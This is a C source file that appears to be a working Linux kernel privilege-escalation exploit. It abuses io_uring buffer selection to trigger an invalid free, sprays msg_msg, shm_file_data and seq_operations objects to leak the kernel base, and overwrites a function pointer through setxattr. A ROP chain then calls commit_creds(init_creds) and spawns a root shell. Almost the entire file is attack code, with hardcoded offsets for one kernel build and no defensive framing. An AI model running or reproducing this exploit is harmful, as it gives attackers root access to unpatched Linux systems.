#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <liburing.h>
#include <linux/capability.h>
#include <linux/types.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/capability.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

#ifdef DEBUG
#define errExit(msg)    \
  do {                  \
    perror(msg);        \
    exit(EXIT_FAILURE); \
  } while (0)
#define WAIT()            \
  do {                    \
    puts("[WAITING...]"); \
    getchar();            \
  } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
  do {               \
  } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define ulong unsigned long
#define PAGE 0x1000UL
#define NUM_IOBUF 0x100  // UNIMPLEMENTED:
// Tweak so the last io_buffer is near the end of the page
char iobufs[PAGE][NUM_IOBUF] = {0};

pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

/**
 * @brief Initialize state that can be shared between threads
 *
 * @return struct state* shared state
 */
struct state *initialize_shared_state(void) {
  int shm_id = shmget(IPC_PRIVATE, PAGE, 0666 | IPC_CREAT);
  if (shm_id < 0) errExit("shmget");

  return (struct state *)shmat(shm_id, NULL, 0);
}

/**
 * Open /proc/self/maps
 *
 * @return int fd in /proc/self/maps
 */
int open_maps(void) {
  int fd = open("/proc/self/maps", O_RDONLY);
  assert(fd >= 2);
  return fd;
}

/**
 * @brief Set up io_uring
 *
 * @param ring io_uring
 */
void init_uring(struct io_uring *ring) { io_uring_queue_init(1024, ring, 0); }

/**
 * @brief Read using Buffer Group
 *
 * @param ring io_uring
 * @param fd fd of the file you want to read
 * @param size size to read
 * @param offset Offset to read
 * @param bgid BGID of Buffer Group (Buffer Group ID)
 */
void ring_submit_read(struct io_uring *ring, int fd, size_t size, ulong offset,
                      int bgid) {
  struct io_uring_sqe *sqe = NULL;

  // Get available SQEs
  sqe = io_uring_get_sqe(ring);
  // Pack the request into SQE
  io_uring_prep_read(sqe, fd, NULL, size, offset);
  // set flag to use Buffer Group
  io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
  // Set BGID (refer to the definition of struct io_uring_sqe)
  sqe->buf_group = bgid;
  // notify kernel
  io_uring_submit(ring);
}

/**
 * @brief Share Buffer Group with kernel
 *
 * @param ring io_uring
 * @param buf_addr Start address of the buffer you want to share
 * @param len Size of one buffer you want to share
 * @param num number of buffers you want to share
 * @param bgid Group ID of the Buffer Group you want to share
 * @param bid_start Starting number of Buffer ID of Buffer Group you want to
 * share
 */
void ring_submit_buffer(struct io_uring *ring, char *buf_addr, int len, int num,
                        int bgid, int bid_start) {
  struct io_uring_sqe *sqe = NULL;
  struct io_uring_cqe *cqe = NULL;

  // Get available SQEs
  sqe = io_uring_get_sqe(ring);
  // Pack the request into SQE
  io_uring_prep_provide_buffers(sqe, buf_addr, len, num, bgid, bid_start);
  // notify kernel
  assert(io_uring_submit(ring) >= 0);
}

/**
 * @brief Wait until response is returned to CQ
 *
 * @return int CQE res (BID of used buffer)
 *
 * @param ring io_uring
 */
int ring_wait_cqe(struct io_uring *ring) {
  struct io_uring_cqe *cqe = NULL;

  // Get the CQE that was returned as a response
  io_uring_wait_cqe(ring, &cqe);
  assert(cqe->res >= 0);
  int ret = cqe->res;
  io_uring_cqe_seen(ring, cqe);
  return ret;
}

#define MSGMSG_HEADER_SIZE 0x30UL
#define DATALEN_MSG (PAGE - MSGMSG_HEADER_SIZE)
#define MSGMSG_SIZE 0x20
struct msgmsg20 {
  long mtype;
  char mtext[(MSGMSG_HEADER_SIZE + DATALEN_MSG) + MSGMSG_SIZE - 8];  //
};

/**
 * @brief kmalloc-32 for struct msg-msg
 * @param msg `struct msgmsg20`
 * @param num
 *
 * @return int
 */
int allocate_msgmsg20(struct msgmsg20 *msg, int num) {
  memset(&msg->mtext, 'A', sizeof(msg->mtext));

  int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
  for (int ix = 0; ix != num; ++ix) {
    if (msgsnd(qid, msg, sizeof(msg->mtext) - MSGMSG_HEADER_SIZE, 0) < 0)
      errExit("msgsnd");
  }
  return qid;
}

/**
 * @brief kmalloc-32 `shm_file_data`
 */
void allocate_shm_file_data(void) {
  int shmid = shmget(IPC_PRIVATE, 0x1000, 0666 | IPC_CREAT);
  void *addr = shmat(shmid, NULL, 0);
  assert(addr != (void *)-1);
}

void pinning_thread(int core) {
  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(core, &mask);

  if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
    errExit("pthread_setaffinity_np");
  }
}

ulong kbase;
uint64_t saved_stack;

void getshell() {
  // getshell+0x8:
  asm("lea rsp, [rip+saved_stack];\n");
  logOK("Get root with uid = %d\n", getuid());
  system("sh");
}

void pwn(int fd) {
  asm("mov rax,%0;\n"
      "mov r15, rax ; add r15, 0x148645;\n"  // mov rdi ; ret
      "mov r14, rax ; add r14, 0xe35e20;\n"  // init_creds
      "mov r13, rax ; add r13, 0x77180;\n"   // commit_creds
      "mov r12, rax ; add r12, 0x147db3;\n"  // pop rcx ; ret
      "lea rbp, [rip+getshell+0x8];\n"
      "mov rbx, rax ; add rbx, 0xd94f9;\n"  // pop r11 ; pop r12 ; pop rbp ;
                                            // ret
      "mov r8, rax ; add r8, 0x8000fb;\n"
      "xor eax, eax;\n"
      "syscall;\n"
      :
      : "r"(kbase));
}

int main(void) {
  system("echo LOL >  /tmp/hehe");
  struct io_uring ring;
  saved_stack = (ulong)&ring;
  struct msgmsg20 msg = {.mtype = 0x1};
  int fd = open_maps();

  // Initialize ring
  init_uring(&ring);

  // spray struct io_buffer
  ring_submit_buffer(&ring, (char *)iobufs, PAGE, NUM_IOBUF, 0, 0);

  // Allocate struct msg_msg
  int qid = allocate_msgmsg20(&msg, 1);

  // Call kfree
  logInfo("Allocation done! Invoking invaild free ...");
  sleep(1);
  ring_submit_read(&ring, fd, 0x20, 0, 0);
  ring_wait_cqe(&ring);

  sleep(1);

  allocate_shm_file_data();

  sleep(1);

  msgrcv(qid, &msg, sizeof(msg), msg.mtype, 0);

  ulong *leak = (ulong *)&msg.mtext[DATALEN_MSG];

  const ulong init_ipc_ns = leak[0];
  kbase = init_ipc_ns - 0xeb0d60;  // todo: change later
  logOK("init_ipc_ns: 0x%lx\n", init_ipc_ns);
  logOK("kbase: 0x%lx\n", kbase);

  ring_submit_buffer(&ring, (void *)iobufs, PAGE, NUM_IOBUF, 0, 0);
  int stat_fd = open("/proc/self/stat", O_RDONLY);
  logInfo("Allocation seq_operations done! Invoking invaild free ...");

  ring_submit_read(&ring, fd, 0x20, 0, 0);
  ring_wait_cqe(&ring);

  sleep(1);

  ulong hehe[4] = {kbase + 0x28945c};
  setxattr("/tmp/hehe", "ABCDEFG", hehe, sizeof(hehe), 0);

  pwn(stat_fd);

  WAIT();

  return 0;
}
